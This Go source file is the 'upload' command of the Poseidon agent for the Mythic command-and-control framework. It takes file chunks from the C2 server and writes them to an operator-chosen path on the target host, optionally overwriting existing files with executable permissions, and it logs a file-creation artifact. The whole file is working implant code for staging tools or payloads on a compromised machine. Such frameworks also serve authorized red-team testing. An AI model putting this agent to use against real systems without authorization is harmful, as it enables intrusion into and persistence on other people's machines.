package upload

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	FileID     string
	RemotePath string
	Overwrite  bool
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["file_id"]; ok {
		e.FileID = v.(string)
	}
	if v, ok := alias["remote_path"]; ok {
		e.RemotePath = v.(string)
	}
	if v, ok := alias["overwrite"]; ok {
		e.Overwrite = v.(bool)
	}
	return nil
}

// Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	fixedFilePath := args.RemotePath
	if strings.HasPrefix(fixedFilePath, "~/") {
		dirname, _ := os.UserHomeDir()
		fixedFilePath = filepath.Join(dirname, fixedFilePath[2:])
	}
	r.FullPath, _ = filepath.Abs(fixedFilePath)
	r.Task = &task
	r.SendUserStatusUpdates = true
	totalBytesWritten := 0
	switch _, err = os.Stat(r.FullPath); err {
	case nil:
		if args.Overwrite {
			fp, err := os.OpenFile(r.FullPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
			if err != nil {
				msg.SetError(fmt.Sprintf("Failed to get handle on %s: %s", r.FullPath, err.Error()))
				task.Job.SendResponses <- msg
				return
			}
			defer fp.Close()
			r.ReceivedChunkChannel = make(chan []byte)
			task.Job.GetFileFromMythic <- r

			for {
				newBytes := <-r.ReceivedChunkChannel
				if len(newBytes) == 0 {
					break
				} else {
					fp.Write(newBytes)
					totalBytesWritten += len(newBytes)
				}
			}
			break
		} else {
			msg.SetError(fmt.Sprintf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", r.FullPath))
			task.Job.SendResponses <- msg
			return
		}
	default:
		fp, err := os.Create(r.FullPath)
		if err != nil {
			msg.SetError(fmt.Sprintf("Failed to create file %s. Reason: %s", r.FullPath, err.Error()))
			task.Job.SendResponses <- msg
			return
		}
		defer fp.Close()
		r.ReceivedChunkChannel = make(chan []byte)
		task.Job.GetFileFromMythic <- r

		for {
			newBytes := <-r.ReceivedChunkChannel
			if len(newBytes) == 0 {
				break
			} else {
				fp.Write(newBytes)
				totalBytesWritten += len(newBytes)
			}
		}
		break
	}
	if task.DidStop() {

	} else {
		msg.Completed = true
		msg.UserOutput = fmt.Sprintf("Uploaded %d bytes to %s", totalBytesWritten, r.FullPath)
		artifacts := []structs.Artifact{
			{
				BaseArtifact: "FileCreate",
				Artifact:     r.FullPath,
			},
		}
		msg.Artifacts = &artifacts
		task.Job.SendResponses <- msg
	}
	return
}
